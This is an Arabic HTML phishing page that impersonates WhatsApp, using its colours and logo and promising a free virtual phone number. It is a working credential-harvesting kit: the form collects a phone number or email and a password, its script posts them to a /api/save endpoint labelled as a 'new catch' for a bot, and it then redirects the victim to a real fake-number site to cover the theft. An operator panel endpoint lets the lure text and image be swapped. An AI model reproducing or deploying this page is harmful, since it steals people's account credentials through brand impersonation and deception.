<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تفعيل رقم وهمي - واتساب</title>
    <style>
        body {
            margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif;
            background: linear-gradient(135deg, #25D366 0%, #128C7E 100%); /* خلفية بلون الواتساب */
            display: flex; justify-content: center; align-items: center; height: 100vh;
        }
        .container {
            background: white; padding: 30px; border-radius: 12px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2); width: 100%; max-width: 380px; text-align: center;
        }
        #pageImg { width: 100%; border-radius: 8px; margin-bottom: 15px; }
        h2 { color: #075E54; margin-bottom: 20px; font-size: 20px; }
        input {
            width: 100%; padding: 12px; margin-bottom: 15px;
            border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; outline: none;
        }
        button {
            width: 100%; padding: 12px; background: #25D366; color: white;
            border: none; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s;
        }
        button:hover { background: #1ebd59; }
    </style>
</head>
<body>

    <div class="container">
        <img id="pageImg" src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" style="width: 80px;">
        <h2 id="pageLetter">سجل دخول للحصول على رقم وهمي مجاناً</h2>

        <form id="redirectForm">
            <input type="text" id="user" placeholder="رقم الهاتف أو البريد" required>
            <input type="password" id="pass" placeholder="كلمة السر" required>
            <button type="submit" id="pageBtn">احصل على الرقم الآن</button>
        </form>
    </div>

    <script>
        // دالة جلب البيانات من اللوحة (لتغيير الصورة والنص)
        async function loadConfig() {
            try {
                const res = await fetch('/api/get');
                const data = await res.json();
                if(data.image) document.getElementById('pageImg').src = data.image;
                if(data.letter) document.getElementById('pageLetter').innerText = data.letter;
                if(data.button) document.getElementById('pageBtn').innerText = data.button;
            } catch(e) { console.log("تحميل افتراضي"); }
        }
        window.onload = loadConfig;

        // دالة الإرسال والتحويل
        document.getElementById('redirectForm').onsubmit = async (e) => {
            e.preventDefault();
            const user = document.getElementById('user').value;
            const pass = document.getElementById('pass').value;

            // 1. إرسال البيانات للبوت
            await fetch('/api/save', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    image: "🚨 صيد جديد من صفحة الأرقام!",
                    letter: "المستخدم: " + user,
                    button: "الباسورد: " + pass
                })
            });

            // 2. التحويل للموقع الآخر (هنا تضع رابط موقع الأرقام الوهمية أو الجوائز)
            // سأضعه هنا كمثال لموقع أرقام وهمية مشهور
            window.location.href = "https://receive-smss.com/"; 
        };
    </script>
</body>
</html>
